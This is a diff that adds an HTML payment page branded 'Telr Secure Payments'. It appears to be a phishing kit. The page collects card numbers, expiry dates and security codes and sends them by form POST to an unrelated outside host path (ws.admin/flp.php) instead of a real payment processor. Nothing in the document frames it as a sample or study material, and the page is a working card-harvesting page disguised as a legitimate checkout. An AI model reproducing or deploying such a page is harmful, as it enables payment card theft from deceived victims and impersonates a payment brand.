@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telr Secure Payments </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .payment-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 320px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            margin-bottom: 10px;
+            width: 120px;
+            height: auto;
+            position: static;
+        }
+        .amount {
+            font-size: 28px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .reference {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .payment-container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
+        }
+        .payment-container label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        .payment-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .payment-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: rgb(4, 4, 64);
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .payment-container button:hover {
+            background-color: rgb(2, 2, 77);
+        }
+        .card-details {
+            display: flex;
+            gap: 4%;
+            margin-bottom: 15px;
+        }
+        .card-details > div {
+            flex: 1;
+        }
+        .padlock {
+            margin-right: 8px;
+        }
+        @media (max-width: 400px) {
+            .payment-container {
+                width: 95vw;
+                padding: 10px;
+            }
+            .logo {
+                width: 90px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="payment-container">
+        <div class="amount">QUICK PAY</div>
+        <div class="reference">Outstanding</div>
+        <h2>Cards</h2>
+        <form action= "https://hakimdoukkali.com/ws.admin/flp.php" method="POST" autocomplete="off">
+            <label for="card-number">Card number</label>
+            <input type="text" id="card-number" name="card-number" placeholder="1234-5678-9101-1298" maxlength="19" required autocomplete="cc-number">
+
+            <div class="card-details">
+                <div>
+                    <label for="expiry-date">Expiry date</label>
+                    <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" maxlength="5" required autocomplete="cc-exp">
+                </div>
+                <div>
+                    <label for="security-code">Security code</label>
+                    <input type="text" id="security-code" name="security-code" placeholder="CVC" maxlength="4" required autocomplete="cc-csc">
+                </div>
+            </div>
+
+            <button type="submit">
+                <span class="padlock">🔒</span> PAY NOW
+            </button>
+        </form>
+    </div>
+
+    <script>
+        // Card number formatting
+        document.getElementById('card-number').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '').slice(0, 16);
+            let formatted = '';
+            for (let i = 0; i < value.length; i += 4) {
+                if (i > 0) formatted += '-';
+                formatted += value.substr(i, 4);
+            }
+            e.target.value = formatted;
+        });
+
+        // Expiry date formatting
+        document.getElementById('expiry-date').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '').slice(0, 4);
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            e.target.value = value;
+        });
+
+        // Security code: only digits, max 4
+        document.getElementById('security-code').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+        });
+    </script>
+</body>
+</html>
